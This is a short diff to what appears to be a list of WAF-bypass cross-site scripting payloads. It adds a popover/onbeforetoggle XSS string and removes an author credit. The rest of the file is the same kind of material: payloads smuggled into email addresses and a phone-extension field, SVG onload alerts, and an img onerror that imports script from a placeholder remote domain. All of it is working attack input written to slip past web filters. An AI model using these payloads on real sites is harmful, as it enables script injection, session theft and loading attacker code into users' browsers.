@@ -1,7 +1,8 @@
-WAF Bypass payloads by coffinxp:
+WAF Bypass payloads :
 
 "><img/src/onerror=import('//domain/')>"@yourdomain
 013371337;ext=<img/src/onerror=import('//domain/')>
+<button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
 
 <Svg Only=1 OnLoad=confirm(document.domain)>
 <Svg/OnLoad=alert(1337)>"@gmail.com
